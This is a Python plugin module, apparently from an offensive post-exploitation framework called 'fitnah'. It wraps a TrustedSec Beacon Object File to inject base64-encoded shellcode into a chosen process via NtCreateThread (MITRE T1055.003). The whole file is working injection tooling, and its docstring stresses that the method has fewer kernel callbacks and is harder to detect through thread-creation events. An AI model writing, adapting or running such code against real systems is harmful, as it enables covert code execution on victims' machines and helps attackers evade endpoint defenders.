"""execution/process_mirror — section-based process injection via NtCreateThread BOF. MITRE T1055.003

BOF: TrustedSec ntcreatethread (CS-Remote-OPs-BOF)
Args: "ib" — int32 pid, bytes shellcode
Creates a remote thread via NtCreateThread (lower-level than CreateRemoteThread) —
fewer kernel callbacks, harder to detect via thread-creation events.
"""
import base64
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ProcessMirror(BasePlugin):
    NAME        = "process_mirror"
    DESCRIPTION = "Inject shellcode via NtCreateThread BOF — no PowerShell, lower-level than CRT."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1055.003"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("pid",           int, required=True,  help="Target PID"),
        Param("shellcode_b64", str, required=True,  help="Base64-encoded shellcode"),
    )

    @mitre("T1055.003")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        pid  = int(params["pid"])
        sc   = base64.b64decode(params["shellcode_b64"].strip())
        args = ctx.bof_pack("ib", pid, sc)
        r    = ctx.bof("ntcreatethread", args_b64=args, timeout=30)
        if r["status"] != "ok":
            return ModuleResult.err(f"process_mirror failed: {r['output']}")
        return ModuleResult.ok(data=r["output"])
